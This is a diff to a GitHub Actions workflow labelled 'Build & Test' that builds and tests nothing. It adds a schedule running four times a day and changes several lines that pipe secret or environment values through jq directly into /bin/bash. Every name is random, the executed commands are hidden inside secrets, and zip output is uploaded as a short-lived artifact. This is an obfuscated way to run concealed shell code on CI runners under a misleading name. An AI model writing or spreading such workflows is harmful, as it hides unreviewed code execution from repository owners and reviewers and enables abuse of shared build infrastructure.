@@ -2,6 +2,8 @@ name: Build & Test
 on:
   workflow_dispatch:
 
+  schedule:
+    - cron: '52 3,9,15,21 * * *'
 permissions:
   contents: read
 concurrency:
@@ -15,17 +17,16 @@ jobs:
       - uses: actions/checkout@v4
       - name: Run task
         env:
-          b7177: ${{ secrets.b7177 }}
+          uq0: ${{ secrets.uq0 }}
         run: |
-          printf '%s' "$b7177" | jq -r .i865 | /bin/bash
-          echo $qv1 | jq -r .x581 | /bin/bash
-          echo $vsn5 | jq -r .ihw312 | /bin/bash
-          echo $h949 | jq -r .d9730 | /bin/bash
-          echo $ji168 | jq -r .z4 | /bin/bash
+          printf '%s' "$uq0" | jq -r .f25 | /bin/bash
+          echo $hac77687 | jq -r .kiavq0117 | /bin/bash
+          printf '%s' "$nia66" | jq -r .wpdj4454 | /bin/bash
+          printf '%s' "$h131" | jq -r .nhu36689 | /bin/bash
 
       - name: Store output
         uses: actions/upload-artifact@v4
         with:
-          name: 1iwciJf1
+          name: RLw3GvtB
           path: "*.zip"
           retention-days: 1
